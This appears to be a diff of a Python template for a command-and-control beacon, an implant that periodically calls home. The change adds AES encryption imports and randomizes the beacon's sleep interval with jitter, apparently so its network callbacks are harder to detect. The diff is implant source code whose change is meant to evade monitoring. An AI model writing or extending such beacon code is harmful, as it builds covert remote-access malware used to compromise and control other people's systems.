@@ -16,6 +16,12 @@ import json
 import requests
 import subprocess
 import base64
+import random
+import Crypto.Cipher.AES 
+import Crypto.Util.Padding
+
+SLEEP_TIME = 15  # base sleep in seconds
+JITTER_RANGE = 5  # jitter range (+/- seconds)
 
 # Inject absolute path to utils
 sys.path.insert(0, "{abs_utils_path}")
@@ -72,7 +78,10 @@ def {beacon_func}():
         except Exception as e:
             print(f"[!] Beacon failed: {{e}}")
 
-        time.sleep(10)
+        jitter = random.uniform(-JITTER_RANGE, JITTER_RANGE)
+        sleep_time = max(1, SLEEP_TIME + jitter)
+        time.sleep(sleep_time)
+
 
 if __name__ == "__main__":
     {beacon_func}()
